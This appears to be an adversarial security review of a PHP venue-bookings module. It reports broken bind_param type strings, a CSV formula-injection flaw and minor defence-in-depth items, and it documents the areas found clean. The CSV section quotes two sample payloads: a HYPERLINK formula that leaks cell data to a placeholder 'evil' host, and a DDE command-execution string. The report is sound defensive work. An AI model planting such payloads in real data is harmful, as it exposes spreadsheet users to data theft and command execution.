# Venue Bookings (#429) — Adversarial Security Review

**Verdict:** No SQL-injection, XSS, CSRF, IDOR, file-upload, XXE, or cron-auth vulnerabilities found — the multi-tenant isolation and injection defences are genuinely solid — BUT there is one confirmed HIGH-impact defect: **8 `mysqli::bind_param()` type-strings in `Venues.php` are one character too short**, which throws an uncaught `ValueError` and breaks every core create/update path (venue, booking, agreement, invoice, window). Plus one MEDIUM CSV-formula-injection exposure via the schedule export.

Scope reviewed: `web/_core/Venues.php` (full), all 24 `web/_apps/venues/*.php` handlers, `api/check.php` + `api/availability.php`, `cron/venue-reminders.php`, the calendar venue-overlay edits, `170_venue_bookings.sql`, and the `GdprEraser.php` / `data-export.php` venue entries.

---

## Findings table

| ID | Severity | Confidence | Location | Title |
| --- | --- | --- | --- | --- |
| SEC-01 | HIGH | CONFIRMED | `web/_core/Venues.php` :327, :496, :916, :1403, :1427, :2674, :2997, :3033 | `bind_param()` type-string one char short in 8 write paths → uncaught `ValueError`, every create/update 500s |
| SEC-02 | MEDIUM | CONFIRMED | `web/_apps/venues/export.php` :90-109 → `web/_core/CsvExporter.php` :70-81 | CSV formula/DDE injection — booking notes/venue name exported to CSV with no `=`/`+`/`-`/`@` neutralisation |
| SEC-03 | LOW | CONFIRMED | `web/_core/Venues.php` :3169-3213 (`recordPayment`) | No server-side cap of a payment against the invoice total (harmless for an outgoing ledger, but allows nonsensical over-payment records) |
| SEC-04 | INFO | CONFIRMED | `web/_core/Venues.php` :957-975 (`resolveWindow`) | `resolveWindow()` SELECT is not site-scoped (all live callers pre-validate the usageTypeID, so not currently reachable cross-tenant) |
| SEC-05 | INFO | CONFIRMED | `web/_apps/venues/agreement-download.php` :76, `invoice-download.php` :68 | Downloads use `basename()` (not `realpath()`) — adequate because the stored name is server-generated random hex, noted as defence-in-depth only |
| SEC-06 | INFO | CONFIRMED | `web/_core/Venues.php` :4056 (`nextSortOrder`) | Dead code — defined, never called |

---

## SEC-01 — `bind_param()` type-strings are one character short in 8 core write paths (HIGH, CONFIRMED)

### The offending code

Eight `mysqli_stmt::bind_param()` calls in `Venues.php` pass a type-specifier string whose length is exactly one less than both the number of bound variables **and** the number of `?` placeholders in the prepared statement. Verified by cross-counting placeholders, argument count, and type-string length for every `bind_param` in the file (the other ~15 are correct — e.g. `recordPayment` at :3203 `'iisisssi'` is right, which confirms the check discriminates correctly).

| Line | Method | Statement | Current (len) | Correct (len) |
| --- | --- | --- | --- | --- |
| 327 | `seedUsageTypes` | INSERT `tblVenueUsageTypeWindows` | `'iissi'` (5) | `'iisssi'` (6) |
| 496 | `saveVenue` | INSERT `tblVenues` | `'isisssssssssi'` (13) | `'isissssssssssi'` (14) |
| 916 | `saveWindow` | INSERT `tblVenueUsageTypeWindows` | `'iisssi'` (6) | `'iissssi'` (7) |
| 1403 | `saveBooking` (create) | INSERT `tblVenueBookings` | `'iiiisissiisiisi'` (15) | `'iiiisissiisiiisi'` (16) |
| 1427 | `saveBooking` (update) | UPDATE `tblVenueBookings` | `'iiisiissisiisiii'` (16) | `'iiisissiisiiisiii'` (17) |
| 2674 | `saveAgreement` (create) | INSERT `tblVenueAgreements` | `'iisssssiissssi'` (14) | `'iissssssiissssi'` (15) |
| 2997 | `saveInvoice` (update+file) | UPDATE `tblVenueInvoices` | `'issssssisssssii'` (15) | `'issssssissssisii'` (16) |
| 3033 | `saveInvoice` (create) | INSERT `tblVenueInvoices` | `'iiisssssissssisi'` (16) | `'iiissssssissssisi'` (17) |

Example (line 496, `saveVenue` create — 14 columns, 14 bound variables, 13 type chars):

```php
$stmt->bind_param(
    'isisssssssssi',                       // <-- 13 chars for 14 variables
    $siteId, $name, $landlordOrgIdVal, $addr1, $addr2, $city, $region,
    $postcode, $countryCode, $timezone, $caretakerName, $caretakerPhone, $notes, $actorUserId
);
```

The corrected strings above were derived from the schema column types in `170_venue_bookings.sql` (`INT` → `i`, `DATE`/`TIME`/`VARCHAR`/`TEXT`/`ENUM` → `s`) in bound-variable order — note several are not merely short but also mis-ordered (e.g. line 1427 has `startTime`/`usageTypeID` types transposed), so replace the whole string, don't just append a char.

### Why it breaks (concrete effect)

- `mysqli_report(MYSQLI_REPORT_STRICT | MYSQLI_REPORT_ERROR)` is set repo-wide (`bootstrap.php:287`).
- On PHP 8.0+ (this project runs 8.4 / targets 8.5), `mysqli_stmt::bind_param()` throws a **`ValueError`** when the type-string length ≠ the number of bound variables — it does not silently truncate or bind.
- `ValueError` extends `Error`, **not** `mysqli_sql_exception`. Every one of these call sites is wrapped only in `try { … } catch (\mysqli_sql_exception $e)` (or, for `seedUsageTypes`, no try/catch at all), so the `ValueError` is **not caught locally** — it propagates to the global `set_exception_handler` (`bootstrap.php:570`) → HTTP 500.
- Net effect: **creating or updating a venue, booking (single or series-import), agreement, invoice, or usage-type window fatals with a 500.** `seedUsageTypes` runs inside venue creation, so even the first venue-create is unusable.
- Secondary disclosure: in debug mode for admins the handler `echo`s the full stack trace (`bootstrap.php:576-577`).

This shipped because `venues.enabled` seeds `'0'` (opt-in) and the multi-agent build was evidently never exercised end-to-end against a database; `php -l` cannot catch a runtime `bind_param` arity error.

### Recommended fix

Replace each of the 8 type-strings with the "Correct" column above. After fixing, the surrounding `catch (\mysqli_sql_exception $e)` blocks become the intended safety net again. Consider adding an integration smoke test (or a CI check that counts `?` placeholders vs `bind_param` type-length) so this class of bug is caught — the venue app has no runtime coverage today.

---

## SEC-02 — CSV formula/DDE injection via schedule export (MEDIUM, CONFIRMED)

### The offending code

`web/_apps/venues/export.php` builds each row directly from stored free-text and hands it to the shared exporter with no neutralisation:

```php
'Notes'      => (string) ($b['notes'] ?? ''),
'Status'     => (string) $b['statusName'],
'Venue'      => (string) $b['venueName'],
...
CsvExporter::download($filename, $rows, $headers);
```

`web/_core/CsvExporter.php` (:70-81) writes those values with `fputcsv()` and **does not** prefix or quote cells that begin with `=`, `+`, `-`, `@`, tab, or CR:

```php
$orderedRow[] = (string) ($row[$key] ?? '');
...
fputcsv($output, $orderedRow);
```

### Why it's exploitable

A venue manager (or an imported workbook row) can set a booking `notes` value such as `=HYPERLINK("http://evil/?"&A1,"clickme")` or a legacy DDE payload (`=cmd|'/c calc'!A1`). `export.php` requires only login (viewers can export — the cost column is the only manager-gated part), so a lower-privileged viewer of the same site who downloads the schedule CSV and opens it in Excel/LibreOffice (with formulas/DDE enabled) executes the attacker's formula — classic cross-privilege CSV injection. `venueName`, `statusName`, `usageTypeName`, and `roomName` are equally free-text vectors.

Note: `schedule-pdf.php` is **not** affected — it renders the same fields through `htmlspecialchars()` into HTML for dompdf, where spreadsheet formulas do not evaluate.

### Recommended fix

Neutralise formula-leading cells inside `CsvExporter::download()` (fixes every app's CSV export at once): before `fputcsv`, for any value whose first character is one of `= + - @ \t \r`, prefix a single apostrophe (or wrap as `"'" . $value`). Root cause is the shared `CsvExporter`, so this is arguably a platform fix rather than a venue-only one — but the venue schedule export is a real new consumer that carries attacker-controllable notes into a CSV, so it must be addressed for this feature.

---

## SEC-03 — No cap of a recorded payment against the invoice total (LOW, CONFIRMED)

`Venues::recordPayment()` (:3169) validates the invoice belongs to the caller's site and that `amountPence > 0`, but never checks the payment against the invoice's outstanding balance:

```php
$amountPence = (int) ($data['amountPence'] ?? -1);
if ($amountPence <= 0) { $errors[] = 'Amount must be a positive number of pence.'; }
// ...no comparison to $invoice['amountPence'] or the outstanding balance...
```

`recomputeInvoiceStatus()` then simply sets `paid >= amount → 'paid'`. Because the venue invoice/payment tables are a **pure outgoing ledger** (money the tenant pays a landlord — explicitly *no* linkage to `tblPayment`/`Payments.php`, per the design), an over-recorded payment forges no value and benefits no attacker; it only produces a nonsensical bookkeeping record, fully audited. Negative/zero amounts are already blocked, and cross-tenant is prevented by the site-scoped `getInvoice()`.

**Recommended fix (optional):** reject or warn when `amountPence` would push total paid materially beyond `invoice.amountPence`, purely to keep the ledger sane. Low priority.

---

## SEC-04 — `resolveWindow()` SELECT lacks a site filter (INFO, CONFIRMED)

```php
'SELECT defaultStartTime, defaultEndTime FROM tblVenueUsageTypeWindows '
. 'WHERE usageTypeID = ? AND effectiveFrom <= ? ORDER BY effectiveFrom DESC LIMIT 1'
```

No `siteID` predicate. Every live caller (`saveBooking`, `generateSeries`/`expandSeries`, `reapplyWindowDefaults`, `commitBatch`, `listUsageTypes`) resolves the `usageTypeID` through a site/venue-scoped validator *before* calling this, and the value returned is only a default time window (not sensitive), so it is **not currently reachable cross-tenant**. Flagged as defence-in-depth: add `AND siteID = ?` so a future caller can't turn this into a low-value cross-tenant read.

---

## SEC-05 — Downloads use `basename()` rather than `realpath()` (INFO, CONFIRMED)

`agreement-download.php` and `invoice-download.php` both fetch the file row **site-scoped** (`WHERE fileID/invoiceID = ? AND siteID = ?`), then build the disk path as `…/agreements/ . basename($row['filePath'])`. The stored `filePath` is always a server-generated `bin2hex(random_bytes(16)).ext` (`attachAgreementFile` / `saveInvoice`), never client input, and both stream with `Content-Disposition: attachment` and the stored (finfo-sniffed) MIME — so there is no traversal, no overwrite, and no inline-SVG stored-XSS vector. `basename()` on a fixed base dir is sufficient here; a `realpath()`-against-base-dir check would be belt-and-braces only. No action required.

---

## SEC-06 — `nextSortOrder()` is dead code (INFO)

`Venues::nextSortOrder()` (:4056) is defined (with a table-name allow-list, so even it is injection-safe) but never called anywhere. Cosmetic — remove or wire up.

---

## Categories reviewed and found CLEAN (with evidence)

- **SQL injection — CLEAN.** Every query in `Venues.php` and all handlers uses prepared statements with `bind_param`. Dynamic SQL is limited to: WHERE-clause assembly in `listBookings`/`listAgreements`/`listInvoices` (each fragment is a hardcoded string carrying `?` placeholders; all values bound); `IN (…)` lists in `booking.php`/`invoice.php`/`resolveReminderRecipients` built from `array_fill(0, n, '?')` with bound values; `ORDER BY`/`LIMIT` always literal or integer-cast. No identifier (table/column/direction) is ever built from request input — the only interpolated table names (`deleteVenue`, `nextSortOrder`) come from hardcoded array literals / an allow-list.
- **XSS — CLEAN.** Every echo of DB/user data across `index.php`, `booking.php`, `venue.php`, `manage.php`, `rooms.php`, `usage-types.php`, `statuses.php`, `agreements.php`, `invoices.php`, `invoice.php`, `invoice-pdf.php`, `schedule-pdf.php`, `import.php`, and `_venue_strip.php` passes through `htmlspecialchars(…, ENT_QUOTES, 'UTF-8')`. Inline `style="background-color:"` values come only from `statusColor()`/`KIND_COLORS` (validated hex) and are re-validated against a strict hex regex in `_venue_strip.php`. The one inline `<script>` (`booking.php`) uses `json_encode(..., JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT)`.
- **CSRF — CLEAN.** All 11 state-changing POST handlers call `Auth::verifyCsrf($_POST['csrf_token'] ?? '')` as the first action after the method check, before any side-effect and before/at the manager gate (`booking-save`, `venue-save`, `agreement-save`, `agreement-files`, `invoice-save`, `invoice-payment-save`, `generate`, `rooms`, `usage-types`, `statuses`, `settings`, `import`). `verifyCsrf` uses `hash_equals` + token rotation. No state-changing GET (the only GET side-effect is the idempotent `seedStatuses`).
- **Multi-tenant isolation / IDOR — CLEAN.** Every by-id read/write is site-scoped. `saveBooking` independently re-validates *all* cross-object references through dedicated probes: venue (`validateVenue`→site), status (`validateStatusForSite`→site), usage type (`validateUsageTypeForVenue`→venue+site), room (`validateRoomForVenue`→venue+site), event (`validateEventForSite`→site), agreement (`validateAgreementForVenue`→venue+site), group (`validateGroupForVenue`→venue+site). Invoice-line allocation checks the booking belongs to both the caller's site **and** the invoice's venue. Cross-object attachment of another tenant's status/usage-type/agreement/event is therefore rejected. Downloads, deletes, toggles, payments, and window/vocab operations all carry `AND siteID = ?` (or scope through a site-validated parent batch). The API `availability.php` explicitly re-validates `venueID` via `getVenue(…, siteId)` before use; `check.php` delegates to `classifyEventCoverage`, which re-validates against `Site::id()`.
- **File uploads — CLEAN.** `agreement-files.php` and `invoice-save.php`: hard size cap (10 MB fallback if the setting is missing/zero — a misconfig can't disable it), `is_uploaded_file` check, `finfo` MIME sniff of the actual bytes validated against an allow-list (`AGREEMENT_FILE_MIME_EXT` / the pdf/png/jpeg/webp subset), stored extension derived from the **sniffed** MIME (never the client filename), stored name is `bin2hex(random_bytes(16)).ext` under `_uploads/venues/…` (outside the webroot). No SVG accepted; downloads stream `Content-Disposition: attachment`. Client filename/Content-Type are never trusted for the stored path.
- **XLSX/CSV import (XXE / entity expansion / zip bomb) — CLEAN.** `parseXlsxWorkbook` parses sheet XML with `simplexml_load_string($xml, SimpleXMLElement::class, LIBXML_NONET)` — `LIBXML_NONET` blocks network entities, and crucially `LIBXML_NOENT` is **not** set, so general/external entities are never substituted (no `file://` XXE, no billion-laughs expansion; PHP 8 is also default-safe here). Zip-bomb guards: `numFiles > 200` rejected, each entry's declared uncompressed size checked (`> 20 MB` skipped) *before* `getFromIndex`, rows capped at 5000, cell values `mb_substr(…, 0, 500)`. Upload MIME is finfo-sniffed and the extension allow-listed (`csv`→text/csv|plain|csv, `xlsx`→zip|spreadsheetml). CSV **import** is a read (formula injection N/A on ingest).
- **Cron auth — CLEAN.** `cron/venue-reminders.php` reads `venues.cron_token` (decrypted global setting) and gates with `if ($expected === '' || hash_equals($expected, $incoming) === false) { http_response_code(403); exit; }` — constant-time compare, and an empty/unset token **fails closed** (always 403). Reminder-email links use `$_SERVER['HTTP_HOST']` (a standard host-header caveat for outbound links, INFO-level, mirrors the existing asset cron).
- **Calendar resilience — CLEAN.** The overlay is gated by `AppRegistry::isEnabled('venues')` **and** wrapped in `try/catch` in `calendar/index.php` (`$venueOverlay = []` on any throw). `availabilityForRange` validates its date inputs and returns `[]` on malformed dates. The `_venue_strip.php` renderers are pure formatters that never touch the DB and re-validate every colour against a hex regex before interpolation; view files use `$venueOverlay[$k] ?? []` and only `require_once` the strip when the overlay is non-empty. `classifyEventCoverage` is likewise `try/catch`-wrapped in `calendar/manage/save.php` and never blocks the save. A malformed venue row cannot blank the calendar.
- **GDPR export/erasure — CLEAN.** `GdprEraser::catalogue()` anonymises `tblVenueBookings.updatedByID`, `tblVenueUsageTypeWindows.createdByID`, `tblVenueImportBatches.createdByID` — all three columns exist and are `ON DELETE SET NULL` (verified against `170_venue_bookings.sql`), so the anonymise UPDATE prepares cleanly. `data-export.php` mirrors the same three tables with parameterised, userID-bound SELECTs. Export↔erasure parity holds.
- **Open redirect / header injection — CLEAN.** Redirects use fixed paths with integer-cast IDs; the one user-derived value placed in a `Location` (booking date) is `rawurlencode`d, preventing CRLF/redirect injection.

---

## Out-of-scope observation

My automated `bind_param` placeholder/type/arg cross-count also flagged `web/_apps/calendar/event-overrides-save.php:72` (`'isissssi'`, 8 chars vs 9 args) as a likely mismatch. That file is **pre-existing** (commit for #333, not part of this branch) and outside this review's scope — noting it here only so it can be triaged separately.

---

## Prioritised fix list

1. **SEC-01 (HIGH, do first):** correct all 8 `bind_param` type-strings in `Venues.php` (table above). Without this the app's entire write surface 500s. Add a CI placeholder-vs-type-length check.
2. **SEC-02 (MEDIUM):** neutralise formula-leading cells in `CsvExporter::download()` (benefits venue export + every other CSV export).
3. **SEC-03 (LOW):** optionally cap/warn on over-payment in `recordPayment()`.
4. **SEC-04 (INFO):** add `AND siteID = ?` to `resolveWindow()` for defence-in-depth.
5. **SEC-06 (INFO):** remove the dead `nextSortOrder()`.
6. Triage the out-of-scope `event-overrides-save.php:72` mismatch separately.
